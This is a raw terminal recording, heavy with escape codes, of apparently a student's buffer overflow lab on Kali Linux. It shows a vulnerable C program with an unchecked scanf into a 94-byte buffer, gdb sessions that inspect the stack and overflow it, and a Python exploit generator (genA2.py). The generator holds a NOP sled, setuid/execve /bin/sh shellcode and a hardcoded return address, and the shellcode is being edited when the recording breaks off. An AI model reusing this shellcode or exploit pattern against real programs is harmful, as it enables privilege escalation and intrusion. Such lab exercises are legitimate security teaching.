Script started on 2022-05-04 17:52:32+00:00
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ gcc -g -z execstack -no -pie -o midex2 midex2.c
[01m[Kgcc:[m[K [01;31m[Kerror: [m[Kunrecognized command line option â€˜[01m[K-no[m[Kâ€™; did you mean â€˜[01m[K-n[m[Kâ€™?
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ gcc -g -z execstack -no -pie -o midex2 midex2.c[1P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ls
genA1.py    [0m[37;41mmidex1[0m    [01;32mmidex2[0m    pw.txt     typescript1
input1.txt  midex1.c  midex2.c  README.md  typescript2
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ gdb midex2
GNU gdb (Debian 8.1-4+b1) 8.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from midex2...done.
(gdb) list
4		printf("Not good\n");
5		return -1;
6	}
7	
8	int func2(){
9		printf("The Secret Password is secret!!!\n");
10		return 1;
11	}
12	void main1(){
13		char buffer[MY_SHA3_HASH_LAST_TWO_DIGIT_NUMBER];
(gdb) nex[K[K[K
14		scanf("%s", buffer);
15		func1();
16	}
17	void main(){
18		main1();
19	}
(gdb) 
Line number 20 out of range; midex2.c has 19 lines.
(gdb) run $(cat 94[K5)
Starting program: /home/user01/midex2 $(cat 95)
cat: 95: No such file or directory
^[[A
Not good
[Inferior 1 (process 4002) exited with code 0377]
(gdb) run 95
Starting program: /home/user01/midex2 95

^C
Program received signal SIGINT, Interrupt.
0xb7fd5d39 in __kernel_vsyscall ()
(gdb) 
(gdb) start
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Temporary breakpoint 1 at 0x8049234: file midex2.c, line 18.
Starting program: /home/user01/midex2 95

Temporary breakpoint 1, main () at midex2.c:18
18		main1();
(gdb) next
95
Not good
19	}
(gdb) quit
A debugging session is active.

	Inferior 1 [process 4009] will be killed.

Quit anyway? (y or n) y
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ list
bash: list: command not found
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ne[K[Kclear
[3J[H[2J]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ vi midex2
midex2    midex2.c  
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ vi midex2.c
[?1000h[?2004h[?1049h[22;0;0t[?1h=[?2004h[1;24r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[24;1H"midex2.c" 19L, 312C[2;1Hâ–½[6n[2;1H  [1;1H[>c]10;?]11;?[1;1H[35m#include [m[31m<stdio.h>[m
[35m#define MY_SHA3_HASH_LAST_TWO_DIGIT_NUMBER [m[31m94[m
[32mint[m func1(){[4;9Hprintf([31m"Not good[m[35m\n[m[31m"[m);[5;9H[38;5;130mreturn[m -[31m1[m;
}

[32mint[m func2(){[9;9Hprintf([31m"The Secret Password is secret!!![m[35m\n[m[31m"[m);[10;9H[38;5;130mreturn[m [31m1[m;
}
[32mvoid[m main1(){[13;9H[32mchar[m buffer[MY_SHA3_HASH_LAST_TWO_DIGIT_NUMBER];[14;9Hscanf([31m"[m[35m%s[m[31m"[m, buffer);[15;9Hfunc1();
}
[32mvoid[m main()[106m{[m[18;9Hmain1();
[106m}[m
[94m~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H19,1[10CAll[19;1H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002h[27m[23m[29m[m[H[2J[?25l[1;1H[38;5;81m#include [m[95m<stdio.h>[m
[38;5;81m#define MY_SHA3_HASH_LAST_TWO_DIGIT_NUMBER [m[95m94[m
[38;5;121mint[m func1(){[4;9Hprintf([95m"Not good[m[38;5;224m\n[m[95m"[m);[5;9H[93mreturn[m -[95m1[m;
}

[38;5;121mint[m func2(){[9;9Hprintf([95m"The Secret Password is secret!!![m[38;5;224m\n[m[95m"[m);[10;9H[93mreturn[m [95m1[m;
}
[38;5;121mvoid[m main1(){[13;9H[38;5;121mchar[m buffer[MY_SHA3_HASH_LAST_TWO_DIGIT_NUMBER];[14;9Hscanf([95m"[m[38;5;224m%s[m[95m"[m, buffer);[15;9Hfunc1();
}
[38;5;121mvoid[m main()[46m{[m[18;9Hmain1();
[46m}[m
[94m~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H19,1[10CAll"midex2.c" 19L, 312C[19;1H[?25h[?25l[24;52H^[[19;1H[24;52H  [19;1H[24;52H^[[19;1H[24;52H  [19;1H[?25h[?25l[24;52H:[19;1H[24;1H[K[24;1H:[?2004h[?25hw[?25l[?25hq[?25l[?25ha[?25l[?25h[?25l[?1006l[?1002l[?2004l[23;2t[23;1t[22;2t[22;1t[23;2t[23;1t[24;1H[K[24;1H[?2004l[?1l>[?25h[?1049l[23;0;0t]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ midex2 < 100
bash: 100: No such file or directory
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ./midex 2[K[K2 < 100
bash: 100: No such file or directory
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ./midex2 < 100[K[K[K[K[K$(100)
bash: 100: command not found
^[[A^[[A
Not good
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ./midex2 $(100)c(100)[C[1P100)[1P100)c100)a100)[1P100)[1P100)(100)c100)a100)t100) 100)
cat: 100: No such file or directory

Not good
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ 
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ./mn[K[Kmidex2
100
Not good
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ./midex2[K[K[K[K[K[K[K[Kgdb midexe2[K[K2
GNU gdb (Debian 8.1-4+b1) 8.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from midex2...done.
(gdb) list
4		printf("Not good\n");
5		return -1;
6	}
7	
8	int func2(){
9		printf("The Secret Password is secret!!!\n");
10		return 1;
11	}
12	void main1(){
13		char buffer[MY_SHA3_HASH_LAST_TWO_DIGIT_NUMBER];
(gdb) break [K[K[K[K[K[K
14		scanf("%s", buffer);
15		func1();
16	}
17	void main(){
18		main1();
19	}
(gdb) break 14
Breakpoint 1 at 0x8049201: file midex2.c, line 14.
(gdb) run [K[K[K[Krun A
Starting program: /home/user01/midex2 A

Breakpoint 1, main1 () at midex2.c:14
14		scanf("%s", buffer);
(gdb) INF[K[K[Kinfo register
eax            0x804c000	134529024
ecx            0x7b438129	2068021545
edx            0xbffff754	-1073744044
ebx            0x0	0
esp            0xbffff6b0	0xbffff6b0
ebp            0xbffff718	0xbffff718
esi            0xb7fad000	-1208299520
edi            0x0	0
eip            0x8049201	0x8049201 <main1+17>
eflags         0x216	[ PF AF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) print func2
$1 = {int ()} 0x80491c1 <func2>
(gdb) x/40 [Kx $esp
0xbffff6b0:	0x00000000	0x00c30000	0x00000000	0xb7fff000
0xbffff6c0:	0x00000000	0x00000000	0x00000000	0x6e873e00
0xbffff6d0:	0x0000000b	0xbffff8de	0xb7e07d09	0xb7fb0808
0xbffff6e0:	0xb7fad000	0xb7fad000	0x00000000	0xb7e07e6b
0xbffff6f0:	0xb7fad3fc	0x00000000	0x00000000	0x0804928b
0xbffff700:	0x00000002	0xbffff7c4	0xbffff7d0	0x08049261
0xbffff710:	0xb7fe6f60	0x00000000	0xbffff728	0x08049239
0xbffff720:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff730:	0x00000002	0xbffff7c4	0xbffff7d0	0xbffff754
0xbffff740:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) run AAAAAAAAAAAA
The program being debugged has been started already.
Start it from the beginning? (y or n) Y
Starting program: /home/user01/midex2 AAAAAAAAAAAA

Breakpoint 1, main1 () at midex2.c:14
14		scanf("%s", buffer);
(gdb) $ESP[K[K[K[Kx/[K[Kx/40x $esp
0xbffff6b0:	0x00000000	0x00c30000	0x00000000	0xb7fff000
0xbffff6c0:	0x00000000	0x00000000	0x00000000	0x1e3ed900
0xbffff6d0:	0x0000000b	0xbffff8d3	0xb7e07d09	0xb7fb0808
0xbffff6e0:	0xb7fad000	0xb7fad000	0x00000000	0xb7e07e6b
0xbffff6f0:	0xb7fad3fc	0x00000000	0x00000000	0x0804928b
0xbffff700:	0x00000002	0xbffff7c4	0xbffff7d0	0x08049261
0xbffff710:	0xb7fe6f60	0x00000000	0xbffff728	0x08049239
0xbffff720:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff730:	0x00000002	0xbffff7c4	0xbffff7d0	0xbffff754
0xbffff740:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) print buffer
$2 = "\000\000\000\000\303\000\000\000\000\000\000\360\377\267", '\000' <repeats 13 times>, "\331>\036\v\000\000\000\323\370\377\277\t}\340\267\b\b\373\267\000\320\372\267\000\320\372\267\000\000\000\000k~\340\267\374\323\372\267\000\000\000\000\000\000\000\000\213\222\004\b\002\000\000\000\304\367\377\277\320\367\377\277a\222\004\b"
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
The program being debugged has been started already.
Start it from the beginning? (y or n) Y
Starting program: /home/user01/midex2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, main1 () at midex2.c:14
14		scanf("%s", buffer);
(gdb) next
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
15		func1();
(gdb) SHO[K[K[Ki[Kx/40-x[K[Kx $esp
0xbffff650:	0x41410000	0x41414141	0x41414141	0x41414141
0xbffff660:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff670:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff680:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff690:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6a0:	0x41414141	0x00414141	0xbffff770	0x08049261
0xbffff6b0:	0xb7fe6f60	0x00000000	0xbffff6c8	0x08049239
0xbffff6c0:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff6d0:	0x00000002	0xbffff764	0xbffff770	0xbffff6f4
0xbffff6e0:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) quit
A debugging session is active.

	Inferior 1 [process 4072] will be killed.

Quit anyway? (y or n) y
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ gdb midex2
GNU gdb (Debian 8.1-4+b1) 8.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from midex2...done.
(gdb) list
4		printf("Not good\n");
5		return -1;
6	}
7	
8	int func2(){
9		printf("The Secret Password is secret!!!\n");
10		return 1;
11	}
12	void main1(){
13		char buffer[MY_SHA3_HASH_LAST_TWO_DIGIT_NUMBER];
(gdb) 
14		scanf("%s", buffer);
15		func1();
16	}
17	void main(){
18		main1();
19	}
(gdb) break 15
Breakpoint 1 at 0x8049219: file midex2.c, line 15.
(gdb) run A
Starting program: /home/user01/midex2 A
A

Breakpoint 1, main1 () at midex2.c:15
15		func1();
(gdb) info register
eax            0x1	1
ecx            0x1	1
edx            0xb7fae89c	-1208293220
ebx            0x804c000	134529024
esp            0xbffff6b0	0xbffff6b0
ebp            0xbffff718	0xbffff718
esi            0xb7fad000	-1208299520
edi            0x0	0
eip            0x8049219	0x8049219 <main1+41>
eflags         0x282	[ SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/40x $esp
0xbffff6b0:	0x00410000	0x00c30000	0x00000000	0xb7fff000
0xbffff6c0:	0x00000000	0x00000000	0x00000000	0xd20dde00
0xbffff6d0:	0x0000000b	0xbffff8de	0xb7e07d09	0xb7fb0808
0xbffff6e0:	0xb7fad000	0xb7fad000	0x00000000	0xb7e07e6b
0xbffff6f0:	0xb7fad3fc	0x00000000	0x00000000	0x0804928b
0xbffff700:	0x00000002	0xbffff7c4	0xbffff7d0	0x08049261
0xbffff710:	0xb7fe6f60	0x00000000	0xbffff728	0x08049239
0xbffff720:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff730:	0x00000002	0xbffff7c4	0xbffff7d0	0xbffff754
0xbffff740:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) quit
A debugging session is active.

	Inferior 1 [process 4078] will be killed.

Quit anyway? (y or n) y
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ls
genA1.py    [0m[37;41mmidex1[0m    [01;32mmidex2[0m    pw.txt     typescript1
input1.txt  midex1.c  midex2.c  README.md  typescript2
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ vi genA1.py [K[K[K[K[K2[K[K[K[K[K[K[K[Kcp genA1.py GET[K[K[KgenA2.PY[K[KPy
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ cp genA1.py genA2.Py[1PyPy[1Pypy
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ls
genA1.py  genA2.Py    [0m[37;41mmidex1[0m    [01;32mmidex2[0m    pw.txt     typescript1
genA2.py  input1.txt  midex1.c  midex2.c  README.md  typescript2
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ rm -r gena[KA2.P[KPy 
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ls
genA1.py  input1.txt  midex1.c  midex2.c  README.md    typescript2
genA2.py  [0m[37;41mmidex1[0m      [01;32mmidex2[0m    pw.txt    typescript1
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ gen[K[K[Kvi genA2.py 
[?1000h[?2004h[?1049h[22;0;0t[?1h=[?2004h[1;24r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[24;1H"genA2.py" 9L, 318C[2;1Hâ–½[6n[2;1H  [1;1H[>c]10;?]11;?[1;1H[34m#!/usr/bin/python[m
nopsled = [31m'[m[35m\x90[m[31m'[m * [31m64[m
shellcode = ([4;9H[31m'[m[35m\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2[m[31m'[m +[5;9H[31m'[m[35m\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89[m[31m'[m+[6;9H[31m'[m[35m\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80[m[31m'[m)
padding = [31m'A'[m * ([31m128[m- [31m64[m -[31m32[m)
eip = [31m'[m[35m\x10\xf6\xff\xbf[m[31m'[m
[36mprint[m nopsled + shellcode +  padding + eip
[94m~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H4,14[10CAll[4;14H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002h[27m[23m[29m[m[H[2J[?25l[1;1H[96m#!/usr/bin/python[m
nopsled = [95m'[m[38;5;224m\x90[m[95m'[m * [95m64[m
shellcode = ([4;9H[95m'[m[38;5;224m\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2[m[95m'[m +[5;9H[95m'[m[38;5;224m\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89[m[95m'[m+[6;9H[95m'[m[38;5;224m\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80[m[95m'[m)
padding = [95m'A'[m * ([95m128[m- [95m64[m -[95m32[m)
eip = [95m'[m[38;5;224m\x10\xf6\xff\xbf[m[95m'[m
[1m[96mprint[m nopsled + shellcode +  padding + eip
[94m~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H4,14[10CAll"genA2.py" 9L, 318C[4;14H[?25h[?25l[24;62H9,38[9;38H[?25h[?25l[24;62H8,24[8;24H[?25h[?25l[24;52Hi[8;24H[24;52H [8;24H[24;1H[1m-- INSERT --[m[24;13H[K[24;62H8,24[10CAll[8;24H[?25h[?25l[24;62H7[7;24H[?25h[?25l[24;62H6[6;24H[?25h[?25l[24;62H5[5;24H[?25h[?25l[24;62H4[4;24H[?25h[?25l[3;13H[46m([6;51H)[m[24;62H3,1[3;14H[?25h[?25l([6;51H)[24;62H2,22[2;22H[?25h[?25l[24;62H1,18[1;18H[?25h[?25l[24;62H2,22[2;22H[?25h[?25l[2;21H[K[24;65H1[2;21H[?25h[?25l[2;20H[K[24;65H0[2;20H[?25h[?25l[24;64H19[2;19H[?25h[?25l[2;18H[K[24;65H8[2;18H[?25h[?25l[24;65H7[2;17H[?25h[?25l[2;16H[K[3;1H[95mshellcode = (
        [m[1C\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2[1C[95m +
        [m[1C\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89[1C[95m+
        [m[1C\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80[1C[95m)
padding = [m[1CA[1C[95m * (128- 64 -32)
eip = [m[1C\x10\xf6\xff\xbf
[95mprint nopsled + shellcode +  padding + eip [m[24;65H6[2;16H[?25h[?25l[95m\x9[m[2;15H[K[24;65H5[2;15H[?25h[?25l[2;14H[K[24;65H4[2;14H[?25h[?25l[38;5;224m\[m[2;13H[K[24;65H3[2;13H[?25h[?25l[2;12H[K[24;65H2[2;12H[?25h[?25l[2;11H[K[3;1Hshellcode = (
        [1C[38;5;224m\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2[m[1C +
        [1C[38;5;224m\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89[m[1C+
        [1C[38;5;224m\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80[m[1C)
padding = [1C[95mA[m[1C * ([3C- [2C -[2C)
eip = [1C[38;5;224m\x10\xf6\xff\xbf[m
[1m[96mprint[m nopsled + shellcode +  padding + eip [24;65H1[2;11H[?25h[?25l[24;65H0[2;10H[?25h[?25l[2;9H[K[24;64H9 [2;9H[?25h[?25l[24;64H8[2;8H[?25h[?25l[2;7H[K[24;64H7[2;7H[?25h[?25l[2;6H[K[24;64H6[2;6H[?25h[?25l[2;5H[K[24;64H5[2;5H[?25h[?25l[2;4H[K[24;64H4[2;4H[?25h[?25l[2;3H[K[24;64H3[2;3H[?25h[?25l[2;2H[K[24;64H2[2;2H[?25h[?25l[2;1H[K[24;64H1[2;1H[?25h[?25l[1;23r[23;1H
[1;24r[1;1H[96m#!/usr/bin/python[m[23;1H[94m~                                                                              [m[24;62H[K[24;62H1,18[10CAll[1;18H[?25h[?25l[2;13H[46m([5;51H)[m[24;62H2,14[2;14H[?25h[?25l([5;51H)[24;62H3,18[3;18H[?25h[?25l[24;62H4[4;18H[?25h[?25l[24;62H5[5;18H[?25h[?25l[24;65H9[5;19H[?25h[?25l[24;64H20[5;20H[?25h[?25l[24;65H1[5;21H[?25h[?25l[24;65H2[5;22H[?25h[?25l[24;65H3[5;23H[?25h[?25l[24;65H4[5;24H[?25h[?25l[24;65H5[5;25H[?25h[?25l[24;65H6[5;26H[?25h[?25l[24;65H7[5;27H[?25h[?25l[24;65H8[5;28H[?25h[?25l[24;65H9[5;29H[?25h[?25l[24;64H30[5;30H[?25h[?25l[24;65H1[5;31H[?25h[?25l[24;65H2[5;32H[?25h[?25l[24;65H3[5;33H[?25h[?25l[24;65H4[5;34H[?25h[?25l[24;65H5[5;35H[?25h[?25l[24;65H6[5;36H[?25h[?25l[24;65H7[5;37H[?25h[?25l[24;65H8[5;38H[?25h[?25l[24;65H9[5;39H[?25h[?25l[24;64H40[5;40H[?25h[?25l[24;65H1[5;41H[?25h[?25l[24;65H2[5;42H[?25h[?25l[24;65H3[5;43H[?25h[?25l[24;65H4[5;44H[?25h[?25l[24;65H5[5;45H[?25h[?25l[24;65H6[5;46H[?25h[?25l[24;65H7[5;47H[?25h[?25l[24;65H8[5;48H[?25h[?25l[24;65H9[5;49H[?25h[?25l[24;64H50[5;50H[?25h[?25l[2;13H[46m([5;51H)[m[24;65H1[5;51H[?25h[?25l[24;65H2[5;52H[?25h[?25l[5;51H[K[2;13H([24;65H1[5;51H[?25h[?25l[5;50H[K[6;1H[95mpadding = [m[1CA[1C[95m * (128- 64 -32)
eip = [m[1C\x10\xf6\xff\xbf
[95mprint nopsled + shellcode +  padding + eip [m[24;65H0[5;50H[?25h[?25l[95m\x8[m[5;49H[K[24;64H49[5;49H[?25h[?25l[5;48H[K[24;65H8[5;48H[?25h[?25l[38;5;224m\[m[5;47H[K[24;65H7[5;47H[?25h[?25l[5;46H[K[24;65H6[5;46H[?25h[?25l[95m\xc[m[5;45H[K[24;65H5[5;45H[?25h[?25l[5;44H[K[24;65H4[5;44H[?25h[?25l[38;5;224m\[m[5;43H[K[24;65H3[5;43H[?25h[?25l[5;42H[K[24;65H2[5;42H[?25h[?25l[95m\x0[m[5;41H[K[24;65H1[5;41H[?25h[?25l[5;40H[K[24;65H0[5;40H[?25h[?25l[38;5;224m\[m[5;39H[K[24;64H39[5;39H[?25h[?25l[5;38H[K[24;65H8[5;38H[?25h[?25l[95m\x4[m[5;37H[K[24;65H7[5;37H[?25h[?25l[5;36H[K[24;65H6[5;36H[?25h[?25l[38;5;224m\[m[5;35H[K[24;65H5[5;35H[?25h[?25l[5;34H[K[24;65H4[5;34H[?25h[?25l[95m\x8[m[5;33H[K[24;65H3[5;33H[?25h[?25l[5;32H[K[24;65H2[5;32H[?25h[?25l[38;5;224m\[m[5;31H[K[24;65H1[5;31H[?25h[?25l[5;30H[K[24;65H0[5;30H[?25h[?25l[95m\xe[m[5;29H[K[24;64H29[5;29H[?25h[?25l[5;28H[K[24;65H8[5;28H[?25h[?25l[38;5;224m\[m[5;27H[K[24;65H7[5;27H[?25h[?25l[5;26H[K[24;65H6[5;26H[?25h[?25l[95m\x8[m[5;25H[K[24;65H5[5;25H[?25h[?25l[5;24H[K[24;65H4[5;24H[?25h[?25l[38;5;224m\[m[5;23H[K[24;65H3[5;23H[?25h[?25l[5;22H[K[24;65H2[5;22H[?25h[?25l[95m\x5[m[5;21H[K[24;65H1[5;21H[?25h[?25l[5;20H[K[24;65H0[5;20H[?25h[?25l[38;5;224m\[m[5;19H[K[24;64H19[5;19H[?25h[?25l[5;18H[K[24;65H8[5;18H[?25h[?25l[95m\x5[m[5;17H[K[24;65H7[5;17H[?25h[?25l[5;16H[K[24;65H6[5;16H[?25h[?25l[38;5;224m\[m[5;15H[K[24;65H5[5;15H[?25h[?25l[5;14H[K[24;65H4[5;14H[?25h[?25l[95m\xe[m[5;13H[K[24;65H3[5;13H[?25h[?25l[5;12H[K[24;65H2[5;12H[?25h[?25l[38;5;224m\[m[5;11H[K[24;65H1[5;11H[?25h[?25l[5;10H[K[24;65H0[5;10H[?25h[?25l[5;9H[K[6;1Hpadding = [1C[95mA[m[1C * ([3C- [2C -[2C)
eip = [1C[38;5;224m\x10\xf6\xff\xbf[m
[1m[96mprint[m nopsled + shellcode +  padding + eip [24;64H9 [5;9H[?25h[?25l[24;64H5[5;5H[?25h[?25l[24;64H1[5;1H[?25h[?25l[4;23r[23;1H
[1;24r[4;9H[95m'[m[38;5;224m\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89[m[95m'[m+[23;1H[94m~                                                                              [m[24;62H[K[24;62H4,60[10CAll[4;60H[?25h[?25l[4;59H[K[24;64H59[4;59H[?25h[?25l[4;58H[K[5;1H[95mpadding = [m[1CA[1C[95m * (128- 64 -32)
eip = [m[1C\x10\xf6\xff\xbf
[95mprint nopsled + shellcode +  padding + eip [m[24;65H8[4;58H[?25h[?25l[95m\x8[m[4;57H[K[24;65H7[4;57H[?25h[?25l[4;56H[K[24;65H6[4;56H[?25h[?25l[38;5;224m\[m[4;55H[K[24;65H5[4;55H[?25h[?25l[4;54H[K[24;65H4[4;54H[?25h[?25l[95m\x6[m[4;53H[K[24;65H3[4;53H[?25h[?25l[4;52H[K[24;65H2[4;52H[?25h[?25l[38;5;224m\[m[4;51H[K[24;65H1[4;51H[?25h[?25l[4;50H[K[24;65H0[4;50H[?25h[?25l[95m\x6[m[4;49H[K[24;64H49[4;49H[?25h[?25l[4;48H[K[24;65H8[4;48H[?25h[?25l[38;5;224m\[m[4;47H[K[24;65H7[4;47H[?25h[?25l[4;46H[K[24;65H6[4;46H[?25h[?25l[95m\x2[m[4;45H[K[24;65H5[4;45H[?25h[?25l[4;44H[K[24;65H4[4;44H[?25h[?25l[38;5;224m\[m[4;43H[K[24;65H3[4;43H[?25h[?25l[4;42H[K[24;65H2[4;42H[?25h[?25l[95m\x2[m[4;41H[K[24;65H1[4;41H[?25h[?25l[4;40H[K[24;65H0[4;40H[?25h[?25l[38;5;224m\[m[4;39H[K[24;64H39[4;39H[?25h[?25l[4;38H[K[24;65H8[4;38H[?25h[?25l[95m\x6[m[4;37H[K[24;65H7[4;37H[?25h[?25l[4;36H[K[24;65H6[4;36H[?25h[?25l[38;5;224m\[m[4;35H[K[24;65H5[4;35H[?25h[?25l[4;34H[K[24;65H4[4;34H[?25h[?25l[95m\x6[m[4;33H[K[24;65H3[4;33H[?25h[?25l[4;32H[K[24;65H2[4;32H[?25h[?25l[38;5;224m\[m[4;31H[K[24;65H1[4;31H[?25h[?25l[4;30H[K[24;65H0[4;30H[?25h[?25l[95m\x7[m[4;29H[K[24;64H29[4;29H[?25h[?25l[4;28H[K[24;65H8[4;28H[?25h[?25l[38;5;224m\[m[4;27H[K[24;65H7[4;27H[?25h[?25l[4;26H[K[24;65H6[4;26H[?25h[?25l[95m\x2[m[4;25H[K[24;65H5[4;25H[?25h[?25l[4;24H[K[24;65H4[4;24H[?25h[?25l[38;5;224m\[m[4;23H[K[24;65H3[4;23H[?25h[?25l[4;22H[K[24;65H2[4;22H[?25h[?25l[95m\x6[m[4;21H[K[24;65H1[4;21H[?25h[?25l[4;20H[K[24;65H0[4;20H[?25h[?25l[38;5;224m\[m[4;19H[K[24;64H19[4;19H[?25h[?25l[4;18H[K[24;65H8[4;18H[?25h[?25l[95m\x6[m[4;17H[K[24;65H7[4;17H[?25h[?25l[4;16H[K[24;65H6[4;16H[?25h[?25l[38;5;224m\[m[4;15H[K[24;65H5[4;15H[?25h[?25l[4;14H[K[24;65H4[4;14H[?25h[?25l[95m\x5[m[4;13H[K[24;65H3[4;13H[?25h[?25l[4;12H[K[24;65H2[4;12H[?25h[?25l[38;5;224m\[m[4;11H[K[24;65H1[4;11H[?25h[?25l[4;10H[K[24;65H0[4;10H[?25h[?25l[4;9H[K[5;1Hpadding = [1C[95mA[m[1C * ([3C- [2C -[2C)
eip = [1C[38;5;224m\x10\xf6\xff\xbf[m
[1m[96mprint[m nopsled + shellcode +  padding + eip [24;64H9 [4;9H[?25h[?25l[24;64H5[4;5H[?25h[?25l[24;64H1[4;1H[?25h[?25l[3;23r[23;1H
